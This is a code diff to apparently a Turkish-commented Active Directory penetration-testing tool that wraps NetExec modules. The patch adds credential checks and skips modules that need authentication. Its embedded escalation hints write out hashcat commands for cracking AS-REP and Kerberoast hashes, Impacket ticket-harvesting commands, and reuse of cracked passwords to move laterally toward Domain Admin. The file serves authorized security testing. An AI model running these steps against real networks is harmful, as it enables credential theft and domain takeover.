@@ -583,7 +583,7 @@ def smb_scan(
     if _cap.nxc_has_module("webdav"):
         runs.append(("smb-webdav", base + ["-M", "webdav"]))
     # LAPS: kimlik varken yerel admin parolaları okunabiliyorsa doğrudan erişim
-    if username or nthash:
+    if username and (password is not None or nthash or use_kerberos):
         runs.append(("smb-laps", base + ["-M", "laps"]))
         # NTLMv1 / LM izinli mi? (LmCompatibilityLevel) — relay + crackable auth
         runs.append(("smb-ntlmv1", base + ["-M", "ntlmv1"]))
@@ -908,7 +908,7 @@ def ldap_scan(
         ("ldap-pass-not-required", base + ["--password-not-required"]),
     ]
     # Kimlik varken ek enumerasyon (bind gerektirenler)
-    if username or nthash:
+    if username and (password is not None or nthash or use_kerberos):
         runs.append(("ldap-gmsa", base + ["--gmsa"]))
         # Kullanıcı 'description' alanında saklanan parolalar (klasik, yüksek-değerli)
         runs.append(("ldap-desc", base + ["-M", "get-desc-users"]))
@@ -918,7 +918,13 @@ def ldap_scan(
         runs.append(("ldap-adcs", base + ["-M", "adcs"]))
 
     results = []
+    has_auth = bool(username and (password is not None or nthash or use_kerberos))
     for label, argv in runs:
+        if label == "ldap-kerberoast" and not has_auth:
+            results.append(CommandResult(tool=f"nxc:{label}:skip", argv=[], returncode=None,
+                           stdout="", stderr="", duration=0,
+                           error="Kimlik gerekli", error_kind="skipped"))
+            continue
         results.append(run(argv, tool=f"nxc:{label}", timeout=timeout, dry_run=dry_run))
     return results
 
@@ -956,7 +962,7 @@ def parse_ldap(results: list[CommandResult], report: ScanReport) -> None:
                 escalation=(
                     "1) Hash'i çevrimdışı kır:\n"
                     "   hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt\n"
-                    "   • adscan bunu OTOMATİK yapar: --crack (ya da --auto/--full)\n"
+                    "   • Çevrimdışı kırma: açıkça --crack (ya da --auto)\n"
                     f"2) Kimliksiz toplama (kullanıcı listesiyle): GetNPUsers.py <domain>/ "
                     f"-dc-ip {target} -usersfile users.txt -no-pass\n"
                     f"3) Kırılan parolayla yanal hareket: adscan {target} --reuse -u <hesap> -p <kırılan>\n"
@@ -981,7 +987,7 @@ def parse_ldap(results: list[CommandResult], report: ScanReport) -> None:
                     "1) Hash'i çevrimdışı kır (RC4):\n"
                     "   hashcat -m 13100 loot/kerb.txt /usr/share/wordlists/rockyou.txt\n"
                     "   • AES bilet ise: -m 19600 (AES128) / -m 19700 (AES256)\n"
-                    "   • adscan bunu OTOMATİK yapar: --crack (ya da --auto/--full)\n"
+                    "   • Çevrimdışı kırma: açıkça --crack (ya da --auto)\n"
                     f"2) Alternatif toplama: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip {target} -request\n"
                     f"3) Kırılan servis parolasıyla yanal hareket: adscan {target} --reuse -u <svc> -p <kırılan>\n"
                     "4) SPN sahibi ayrıcalıklıysa (Domain Admins üyesi) -> doğrudan DA;\n"
@@ -1227,7 +1233,14 @@ def vuln_scan(
         runs.append(("sccm", ldap_base + ["-M", "sccm"]))
 
     results = []
+    has_auth = bool(username and (password is not None or nthash or use_kerberos))
+    auth_required = {"maq", "pre2k", "nopac", "enum-trusts", "sccm"}
     for label, argv in runs:
+        if label in auth_required and not has_auth:
+            results.append(CommandResult(tool=f"nxc:{label}:skip", argv=[], returncode=None,
+                           stdout="", stderr="", duration=0,
+                           error="Kimlik gerekli", error_kind="skipped"))
+            continue
         results.append(run(argv, tool=f"nxc:{label}", timeout=timeout, dry_run=dry_run))
     return results
 
